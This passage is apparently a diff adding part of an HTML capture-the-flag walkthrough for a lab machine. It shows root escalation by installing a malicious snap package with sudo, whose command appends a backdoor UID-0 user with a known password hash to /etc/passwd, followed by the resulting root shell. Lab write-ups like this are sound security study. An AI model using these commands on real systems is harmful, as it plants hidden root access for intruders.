+    <li>Then I install it, which executed the bash command that I built into the malicious snap package.  The bash command I used is adding a 2nd root user to the /etc/passwd file.</li>
+    <ul>
+        <li>My malicious command: echo "root2:S3g6q5KuTzNkU:0:0:root:/root:/bin/bash" >> /etc/passwd</li>
+        <ul>
+            <li>The password hash is for the password: root</li>
+        </ul>
+    </ul>
+
+    <pre>
+[brucetherealadmin@armageddon tmp]$ sudo /usr/bin/snap install ./xxxx_1.0_all.snap --dangerous --devmode&#13;&#10;xxxx 1.0 installed
+    </pre>
+
+    <pre>
+[brucetherealadmin@armageddon tmp]$ cat /etc/passwd | tail&#13;&#10;nobody:x:99:99:Nobody:/:/sbin/nologin&#13;&#10;systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin&#13;&#10;dbus:x:81:81:System message bus:/:/sbin/nologin&#13;&#10;polkitd:x:999:998:User for polkitd:/:/sbin/nologin&#13;&#10;sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin&#13;&#10;postfix:x:89:89::/var/spool/postfix:/sbin/nologin&#13;&#10;apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin&#13;&#10;mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin&#13;&#10;brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash&#13;&#10;root2:S3g6q5KuTzNkU:0:0:root:/root:/bin/bash
+    </pre>
+
+    <li>Now I switch to the root2 user and we have our root shell.</li>
+
+    <pr>
+[brucetherealadmin@armageddon tmp]$ su root2&#13;&#10;Password: &#13;&#10;[root@armageddon tmp]# id&#13;&#10;uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+    </pr>
+
+
+
+
+
+
+</body>
+</html>
+
